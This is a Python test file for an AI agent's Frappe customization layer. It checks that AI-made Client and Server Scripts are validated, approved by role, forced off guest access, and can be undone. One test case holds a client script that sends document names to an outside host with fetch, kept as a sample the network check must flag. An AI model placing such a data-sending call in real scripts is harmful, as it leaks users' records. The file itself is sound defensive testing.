"""Client Script and Server Script kinds (docs/customization/01 §3.3.3, §3.3.4)."""

import json
from unittest.mock import patch

import frappe
from frappe.tests import IntegrationTestCase

from ai_agent.customization.contract import CustomizationError
from ai_agent.customization.kinds import _base
from ai_agent.customization.kinds.client_script import KIND as CLIENT
from ai_agent.customization.kinds.server_script import KIND as SERVER

ADMIN = "Administrator"
SM_ONLY = "ai-customize-sm-only@example.com"


def critical(report):
	return {c.code for c in report.critical()}


def codes(report, level):
	return {c.code for c in report.checks if c.level == level}


class ScriptTestCase(IntegrationTestCase):
	def setUp(self):
		frappe.set_user(ADMIN)
		self.suffix = frappe.generate_hash(length=6)

	def track(self, doctype, name):
		def remove():
			frappe.set_user(ADMIN)
			if frappe.db.exists(doctype, name):
				frappe.delete_doc(doctype, name, force=True, ignore_permissions=True)
			frappe.client_cache.delete_value("server_script_map")
			frappe.clear_cache(doctype="ToDo")

		self.addCleanup(remove)
		return name


class TestServerScriptKind(ScriptTestCase):
	BLOCKER = 'if doc.description and "AI-BLOCK" in doc.description:\n    frappe.throw("Blocked by the test script")\n'

	def test_event_script_blocks_save_then_undo_disables(self):
		name = self.track("Server Script", f"AI Test Blocker {self.suffix}")
		spec = SERVER.normalize({"operation": "create", "name": name, "script_type": "DocType Event",
			"reference_doctype": "ToDo", "doctype_event": "Before Save", "script": self.BLOCKER,
			"purpose": "Block ToDos marked AI-BLOCK"}, ADMIN)
		self.assertTrue(spec["script"].startswith("# ai_agent: Block ToDos marked AI-BLOCK"))
		report = SERVER.check(spec, ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertEqual(report.risk, "high")
		self.assertIn("dry_run", report.preview)
		self.assertTrue(report.preview["dry_run"]["ran"])
		json.dumps(report.to_dict())  # stored in the approval payload

		result = SERVER.execute(spec, ADMIN)
		verify = SERVER.verify(spec, result)
		self.assertFalse([c for c in verify if c.level == "critical"], [c.message for c in verify])
		self.assertTrue(_base.is_ai_made(frappe.db.get_value("Server Script", name, "script")))

		todo = frappe.get_doc({"doctype": "ToDo", "description": "AI-BLOCK please"})
		with self.assertRaises(frappe.ValidationError):
			todo.insert()

		self.assertEqual(result["undo"], {"operation": "disable", "name": name})
		self.assertEqual(SERVER.snapshot(result["undo"]), SERVER.snapshot(spec))
		SERVER.execute(result["undo"], ADMIN)
		todo = frappe.get_doc({"doctype": "ToDo", "description": "AI-BLOCK please"}).insert()
		frappe.delete_doc("ToDo", todo.name, force=True)

	def test_api_allow_guest_is_forced_off(self):
		method = f"ai_test_api_{self.suffix.lower()}"
		name = self.track("Server Script", method)
		spec = SERVER.normalize({"operation": "create", "script_type": "API", "api_method": method, "allow_guest": 1,
			"script": 'frappe.response["message"] = frappe.get_list("ToDo", fields=["name"], limit=1)',
			"purpose": "list one todo"}, ADMIN)
		self.assertEqual(spec["name"], method)
		self.assertEqual(spec["allow_guest"], 0)
		report = SERVER.check(spec, ADMIN)
		self.assertIn("script.allow_guest", codes(report, "warning"))
		self.assertFalse(report.critical())
		result = SERVER.execute(spec, ADMIN)
		self.assertEqual(frappe.db.get_value("Server Script", name, "allow_guest"), 0)
		self.assertFalse([c for c in SERVER.verify(spec, result) if c.level == "critical"])

	def test_duplicate_api_method_is_critical(self):
		method = f"ai_test_dup_{self.suffix.lower()}"
		self.track("Server Script", method)
		args = {"operation": "create", "script_type": "API", "api_method": method, "purpose": "x",
			"script": 'frappe.response["message"] = 1'}
		SERVER.execute(SERVER.normalize(args, ADMIN), ADMIN)
		other = SERVER.normalize({**args, "name": f"{method} copy"}, ADMIN)
		self.assertIn("script.api_taken", critical(SERVER.check(other, ADMIN)))

	def test_approver_without_script_manager(self):
		if not frappe.db.exists("User", SM_ONLY):
			user = frappe.get_doc({"doctype": "User", "email": SM_ONLY, "first_name": "SM only", "send_welcome_email": 0})
			user.insert(ignore_permissions=True)
			user.add_roles("System Manager")
		frappe.db.delete("Has Role", {"parent": SM_ONLY, "role": "Script Manager"})
		spec = SERVER.normalize({"operation": "create", "name": f"AI Test {self.suffix}", "reference_doctype": "ToDo",
			"doctype_event": "Before Save", "script": "x = 1", "purpose": "noop"}, ADMIN)
		self.assertIn("roles.missing", critical(SERVER.check(spec, SM_ONLY)))
		self.assertEqual(SERVER.required_roles, ("System Manager", "Script Manager"))

	def test_server_scripts_disabled_is_critical(self):
		spec = SERVER.normalize({"operation": "create", "name": f"AI Test {self.suffix}", "reference_doctype": "ToDo",
			"doctype_event": "Before Save", "script": "x = 1", "purpose": "noop"}, ADMIN)
		with patch("ai_agent.customization.kinds.server_script.server_scripts_enabled", return_value=False):
			self.assertIn("script.server_scripts_disabled", critical(SERVER.check(spec, ADMIN)))

	def test_evidence_scripts_are_blocked_before_approval(self):
		evidence = "import frappe\n\n@frappe.whitelist()\ndef generate_prompt():\n    return {'a': '{0}'.format(1)}\n"
		spec = SERVER.normalize({"operation": "create", "script_type": "API", "api_method": "generate_prompt_test",
			"script": evidence, "purpose": "evidence"}, ADMIN)
		found = critical(SERVER.check(spec, ADMIN))
		self.assertTrue({"py.import", "py.decorator", "py.format"} <= found, found)

	def test_unsupported_types_and_keys(self):
		with self.assertRaises(CustomizationError):
			SERVER.normalize({"operation": "create", "script_type": "Scheduler Event", "script": "x=1", "purpose": "p"}, ADMIN)
		with self.assertRaises(CustomizationError):
			SERVER.normalize({"operation": "create", "script_type": "API", "api_method": "x.y", "code": "x=1"}, ADMIN)
		with self.assertRaises(CustomizationError):
			SERVER.normalize({"operation": "create", "script_type": "API", "api_method": "Bad Name", "script": "x=1", "purpose": "p"}, ADMIN)


class TestClientScriptKind(ScriptTestCase):
	SCRIPT = 'frappe.ui.form.on("ToDo", {\n  refresh(frm) {\n    frm.set_df_property("description", "bold", 1);\n  }\n});\n'

	def test_create_update_undo(self):
		spec = CLIENT.normalize({"operation": "create", "doctype": "ToDo", "view": "Form", "script": self.SCRIPT,
			"purpose": f"bold description {self.suffix}"}, ADMIN)
		name = self.track("Client Script", spec["name"])
		self.assertEqual(name, f"ToDo - bold description {self.suffix}")
		self.assertTrue(spec["script"].startswith("// ai_agent: "))
		report = CLIENT.check(spec, ADMIN)
		self.assertFalse(report.critical(), [c.message for c in report.critical()])
		self.assertEqual(report.preview["code"]["language"], "javascript")
		result = CLIENT.execute(spec, ADMIN)
		self.assertFalse([c for c in CLIENT.verify(spec, result) if c.level == "critical"])
		self.assertEqual(frappe.db.get_value("Client Script", name, "enabled"), 1)

		new = self.SCRIPT.replace('"bold", 1', '"bold", 0')
		update = CLIENT.normalize({"operation": "update", "name": name, "script": new}, ADMIN)
		report = CLIENT.check(update, ADMIN)
		self.assertIn('-    frm.set_df_property("description", "bold", 1);', report.preview["code"]["diff"])
		result = CLIENT.execute(update, ADMIN)
		self.assertIn('"bold", 0', frappe.db.get_value("Client Script", name, "script"))
		self.assertEqual(result["undo"]["operation"], "update")
		CLIENT.execute(result["undo"], ADMIN)
		self.assertIn('"bold", 1', frappe.db.get_value("Client Script", name, "script"))

		disable = CLIENT.normalize({"operation": "disable", "name": name}, ADMIN)
		result = CLIENT.execute(disable, ADMIN)
		self.assertEqual(frappe.db.get_value("Client Script", name, "enabled"), 0)
		self.assertEqual(result["undo"], {"operation": "enable", "name": name})

	def test_bad_scripts_are_critical(self):
		cases = [
			('frappe.ui.form.on("ToDo", { refresh(frm) { frm.set_value("a" } });', "js.syntax"),
			('frappe.ui.form.on("Sales Invoice", { refresh(frm) {} });', "js.form_target"),
			('frappe.ui.form.on("ToDo", { refresh(frm) { fetch("https://x.io/?d=" + frm.doc.name); } });', "js.network"),
		]
		for script, code in cases:
			with self.subTest(code=code):
				spec = CLIENT.normalize({"operation": "create", "doctype": "ToDo", "script": script, "purpose": "x"}, ADMIN)
				self.assertIn(code, critical(CLIENT.check(spec, ADMIN)))

	def test_node_missing_fails_closed(self):
		spec = CLIENT.normalize({"operation": "create", "doctype": "ToDo", "script": self.SCRIPT, "purpose": "x"}, ADMIN)
		with patch.dict(frappe.conf, {"node_path": "/nonexistent/node"}):
			self.assertIn("js.unavailable", critical(CLIENT.check(spec, ADMIN)))

	def test_protected_doctype_and_name_rules(self):
		spec = CLIENT.normalize({"operation": "create", "doctype": "User", "script": 'frappe.ui.form.on("User", {});', "purpose": "x"}, ADMIN)
		self.assertIn("script.doctype", critical(CLIENT.check(spec, ADMIN)))
		with self.assertRaises(CustomizationError):
			CLIENT.normalize({"operation": "update", "name": "No Such Client Script AI", "script": "x"}, ADMIN)
		with self.assertRaises(CustomizationError):
			CLIENT.normalize({"operation": "create", "doctype": "ToDo", "script": self.SCRIPT}, ADMIN)  # purpose needed
